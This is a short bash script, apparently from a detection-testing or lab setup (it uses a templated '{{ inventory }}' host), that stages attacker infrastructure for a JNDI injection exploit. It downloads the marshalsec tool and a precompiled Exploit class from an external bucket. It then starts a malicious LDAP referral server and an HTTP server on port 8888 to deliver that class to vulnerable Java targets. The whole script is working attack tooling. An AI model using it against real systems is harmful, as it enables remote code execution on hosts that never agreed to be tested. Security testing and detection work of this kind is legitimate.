#!/bin/bash

echo "--> create data dir"
test -d data || mkdir data

echo "--> download jar & class"
curl -s -L -o data/ldap.jar https://detc-artifacts.s3.amazonaws.com/artifacts/marshalsec-0.0.3-SNAPSHOT-all.jar
curl -s -L -o data/Exploit.class https://detc-artifacts.s3.amazonaws.com/artifacts/Exploit.class
curl -s -L -o data/Exploit.java https://detc-artifacts.s3.amazonaws.com/artifacts/Exploit.java


echo "--> start LDAP (background)"
(cd data && java -cp ldap.jar marshalsec.jndi.LDAPRefServer "http://{{ inventory }}:8888/#Exploit") &
echo "--> start http (background)"
(cd data && python3 -m http.server 8888) &
